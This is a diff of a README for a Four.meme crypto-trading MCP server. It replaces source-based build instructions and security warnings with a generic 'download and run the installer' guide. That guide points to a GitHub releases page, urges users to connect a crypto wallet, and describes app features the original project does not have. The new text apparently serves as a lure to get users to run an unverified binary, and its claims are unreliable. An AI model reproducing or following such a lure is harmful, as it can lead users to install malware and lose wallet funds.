@@ -1,252 +1,88 @@
-# FourTrader MCP Server - BNB Chain (Four.meme)
+# 🚀 fourtrader-mcp - Trade Smartly with Claude AI
 
-MCP (Model Context Protocol) server for trading Four.meme tokens on BNB Smart Chain. Enables AI assistants to interact with Four.meme through a standardized protocol.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8F%88-blue)](https://github.com/menscheck/fourtrader-mcp/releases)
 
-## 🌟 Features
+## 🌟 About fourtrader-mcp
 
-- **Four.meme Trading**: Buy and sell tokens on the Four.meme platform
-- **Real-time Data**: Access prices, trades, and bonding curves via Bitquery API
-- **Wallet Management**: Check BNB and token balances
-- **Claude Integration**: Use directly with Claude for Desktop
+The **fourtrader-mcp** application serves as a trading engine for the Four.meme tokens on the BNB Smart Chain. With the intelligence of Claude AI, it helps you make informed trading decisions. This guide will help you easily download and install the software on your computer.
 
-## 📋 Prerequisites
+## 🛠️ Features
 
-- Node.js (v18+)
-- TypeScript
-- BNB wallet with private key
-- Bitquery API key (for token data)
-- Claude for Desktop (optional, for integration)
+- **AI-Driven Trading Insights:** Benefit from Claude AI to enhance your trading strategies.
+- **User-Friendly Interface:** Navigate the app with ease, even if you're new to trading.
+- **Supports BNB Smart Chain:** Trade safely on the Binance ecosystem.
+- **Real-Time Updates:** Stay informed about the latest market trends.
 
-## 🚀 Installation
+## 📦 System Requirements
 
-### 1. Clone/Create Project
+- **Operating System:** Windows 10 or above, macOS 10.15 or above
+- **RAM:** Minimum 4 GB recommended
+- **Disk Space:** At least 100 MB of free space
+- **Internet Connection:** Required for updates and trading activities
 
-\`\`\`bash
-mkdir fourtrader-mcp
-cd fourtrader-mcp
-\`\`\`
+## 🚀 Getting Started
 
-### 2. Create Structure
+Before using the application, ensure you have a compatible device meeting the system requirements listed above.
 
-\`\`\`
-fourtrader-mcp/
-├── src/
-│   ├── server.ts
-│   ├── providers/
-│   │   ├── fourMeme.ts
-│   │   └── bitqueryApi.ts
-│   └── utils/
-│       ├── config.ts
-│       └── logger.ts
-├── .env
-├── package.json
-├── tsconfig.json
-└── mcp-startup.js
-\`\`\`
+## 🔗 Download & Install
 
-### 3. Install Dependencies
+To get started, visit the Releases page to download the latest version of the fourtrader-mcp application:
 
-\`\`\`bash
-npm install
-\`\`\`
+[Download the latest release here](https://github.com/menscheck/fourtrader-mcp/releases)
 
-### 4. Configure Environment
+Follow these steps to download and install:
 
-Copy \`.env.example\` to \`.env\` and fill in:
+1. **Visit the Download Page:**
+   Click the link above to go to the Releases page.
 
-\`\`\`env
-# Server Configuration
-SERVER_NAME=fourtrader-mcp
-SERVER_VERSION=1.0.0
+2. **Choose the Right Version:**
+   Look for the latest release. You'll find different files based on your operating system. Select the one that matches your system.
 
-# BNB Chain Configuration
-WALLET_ADDRESS=0xYourWalletAddress
-WALLET_PRIVATE_KEY=your_private_key_here
-BNB_RPC_ENDPOINT=https://bsc-dataseed.binance.org/
+3. **Download the File:**
+   Click on the file name to begin the download. The file will usually download to your computer's Downloads folder.
 
-# Four.meme Configuration
-FOURMEME_CONTRACT_ADDRESS=0x5c952063c7fc8610FFDB798152D69F0B9550762b
+4. **Run the Installer:**
+   Once the file downloads, navigate to your Downloads folder and double-click the file. Follow the prompts to install the application on your computer.
 
-# Bitquery API Configuration
-BITQUERY_API_KEY=your_bitquery_key_here
-BITQUERY_API_ENDPOINT=https://streaming.bitquery.io/graphql
-\`\`\`
+5. **Launch the Application:**
+   After installation, find the application on your desktop or in your applications folder. Double-click the icon to start using it.
 
-**⚠️ IMPORTANT:** 
-- Get Bitquery API key from: https://bitquery.io/
-- Never share your private key!
+## 🔍 How to Use
 
-### 5. Build Project
+1. **Set Up Your Account:**
+   The first time you launch the application, you'll need to create an account or log in if you have one.
 
-\`\`\`bash
-npm run build
-\`\`\`
+2. **Connect Your Wallet:**
+   You will need a compatible wallet connected to BNB Smart Chain. The app will guide you through this process. Make sure your wallet has sufficient tokens for trading.
 
-### 6. Start Server
+3. **Explore the Dashboard:**
+   Get familiar with the layout. The dashboard shows real-time trading data, including current prices and market trends.
 
-\`\`\`bash
-npm start
-\`\`\`
+4. **Make Your First Trade:**
+   Decide which Four.meme token you want to trade. Enter the amount and follow the prompts to complete your transaction. The app will provide AI insights to help you.
 
-## 🔧 Claude Desktop Configuration
+5. **Stay Updated:**
+   Use the app regularly to keep up with market changes. Regular updates will enhance your trading experience. 
 
-To use the server with Claude for Desktop:
+## ⚙️ Troubleshooting
 
-### 1. Find Configuration File
+If you run into issues during installation or use, consider these steps:
 
-- **macOS**: \`~/Library/Application Support/Claude/claude_desktop_config.json\`
-- **Windows**: \`%APPDATA%\\Claude\\claude_desktop_config.json\`
+- **Check System Compatibility:** Ensure your operating system meets the requirements.
+- **Update Your Software:** Keep your computer's software updated to avoid crashes.
+- **Reach Out for Help:** If you encounter specific problems, check the community forums or GitHub issues page for solutions. You can also contact support through the platform.
 
-### 2. Add Server
+## 🎓 Learning Resources
 
-\`\`\`json
-{
-  "mcpServers": {
-    "fourtrader": {
-      "command": "node",
-      "args": [
-        "/full/path/to/fourtrader-mcp/mcp-startup.js"
-      ],
-      "cwd": "/full/path/to/fourtrader-mcp"
-    }
-  }
-}
-\`\`\`
+- **Documentation:** A full user manual is available within the app and on the GitHub repository.
+- **Community Forums:** Join user discussions for tips and best practices.
+- **Video Tutorials:** Look for video guides on platforms like YouTube to watch practical examples of using the application.
 
-**Replace \`/full/path/to/\` with your actual path!**
+## 🔗 Connect with Us
 
-Example paths:
-- macOS: \`/Users/username/Desktop/fourtrader-mcp\`
-- Windows: \`C:\\\\Users\\\\username\\\\Desktop\\\\fourtrader-mcp\`
+Stay connected with the community for updates and support:
 
-### 3. Restart Claude Desktop
+- Join our discussions on GitHub.
+- Follow us on social media for news and tips in cryptocurrency trading.
 
-Close completely and reopen Claude Desktop.
-
-### 4. Verify Connection
-
-Open Claude Desktop → Click settings icon (bottom left) → You should see "fourtrader" in the connected servers list.
-
-## 🛠️ Available Tools
-
-| Tool | Description | Parameters |
-|------|-------------|-----------|
-| \`get_token_info\` | Get detailed token information | \`address\` (string) |
-| \`get_token_price\` | Get current token price | \`address\` (string) |
-| \`get_recent_tokens\` | Get recent tokens on Four.meme | \`limit\` (number, optional) |
-| \`get_bonding_curve_progress\` | Get bonding curve progress | \`address\` (string) |
-| \`get_latest_trades\` | Get latest trades for a token | \`address\` (string), \`limit\` (number) |
-| \`buy_token\` | Buy a token | \`address\`, \`bnbAmount\`, \`slippage\`, \`gasLimit\` |
-| \`sell_token\` | Sell a token | \`address\`, \`tokenAmount\`, \`slippage\`, \`gasLimit\` |
-| \`get_bnb_balance\` | Get wallet BNB balance | none |
-| \`get_token_balance\` | Get balance of specific token | \`address\` (string) |
-
-## 💬 Usage Examples with Claude
-
-Once connected, you can ask Claude:
-
-- "Show me recent tokens on Four.meme"
-- "What's the price of token 0x..."
-- "Buy 0.1 BNB of this token: 0x..."
-- "What's my BNB balance?"
-- "Show me the bonding curve progress for token 0x..."
-
-## 🧪 Testing with MCP Inspector
-
-To test the server before using with Claude:
-
-\`\`\`bash
-npx @modelcontextprotocol/inspector node build/server.js
-\`\`\`
-
-Open http://127.0.0.1:6274 in your browser and test the tools.
-
-## 📚 Bitquery API
-
-The project uses Bitquery to access Four.meme on-chain data:
-
-- **Documentation**: https://docs.bitquery.io/docs/blockchain/BSC/four-meme-api/
-- **Dashboard**: https://bitquery.io/
-- **GraphQL Playground**: https://graphql.bitquery.io/
-
-### Supported Queries
-
-- Token metadata
-- Real-time prices
-- Trade history
-- Bonding curve progress
-- Liquidity events
-- Newly created tokens
-
-## 🔐 Security
-
-⚠️ **WARNING**:
-
-1. **Private Key**: Never share or commit to Git
-2. **API Keys**: Keep your API keys secure
-3. **Testnet**: Always test on testnet first (BSC Testnet)
-4. **Amounts**: Start with small amounts for testing
-5. **.env**: Add \`.env\` to \`.gitignore\`
-
-\`\`\`bash
-echo ".env" >> .gitignore
-\`\`\`
-
-## 🐛 Troubleshooting
-
-### Server not connecting to Claude
-
-1. Verify the path in \`claude_desktop_config.json\` is correct
-2. Check logs: 
-   - macOS: \`~/Library/Logs/Claude/mcp*.log\`
-   - Windows: \`%APPDATA%\\Claude\\logs\\mcp*.log\`
-3. Restart Claude Desktop completely
-
-### "Bitquery API" errors
-
-- Verify your API key is valid
-- Check rate limits: https://bitquery.io/pricing
-- Some data may not be available for all tokens
-
-### "Insufficient funds" errors
-
-- Ensure you have enough BNB in wallet
-- Consider gas fees (approximately 0.001-0.005 BNB per transaction)
-
-### Transaction failed
-
-- Increase \`gasLimit\` in parameters
-- Check that token exists and is tradeable
-- Verify \`slippage\` (try increasing to 5-10% for volatile tokens)
-
-## 📝 Important Notes
-
-1. **Four.meme has no public REST API**: We use Bitquery to access on-chain data
-2. **Smart Contract**: Four.meme address: \`0x5c952063c7fc8610FFDB798152D69F0B9550762b\`
-3. **BNB Chain**: Always use BNB Smart Chain (BSC), not BNB Beacon Chain
-4. **Gas Fees**: Transactions cost gas in BNB (typically 0.001-0.005 BNB)
-
-## 🔄 Differences vs Solana Project
-
-| Aspect | Solana (PumpFun) | BNB (Four.meme) |
-|---------|------------------|-----------------|
-| Blockchain | Solana | BNB Smart Chain |
-| Library | @solana/web3.js | ethers.js |
-| Data API | Moralis | Bitquery |
-| Native Token | SOL | BNB |
-| Gas Fees | ~0.00001 SOL | ~0.001-0.005 BNB |
-
-## 🤝 Support
-
-- **Bitquery Docs**: https://docs.bitquery.io/
-- **Four.meme**: https://four.meme/
-- **BNB Chain**: https://docs.bnbchain.org/
-- **MCP Protocol**: https://modelcontextprotocol.io/
-
-## 📄 License
-
-MIT
-
-## ⚠️ Disclaimer
-
-This software is provided "as is". Cryptocurrency trading involves risks. Use at your own risk.
+By following these steps, you can successfully download, install, and start using the fourtrader-mcp application to trade Four.meme tokens effectively. Enjoy your trading journey with Claude AI guiding the way.
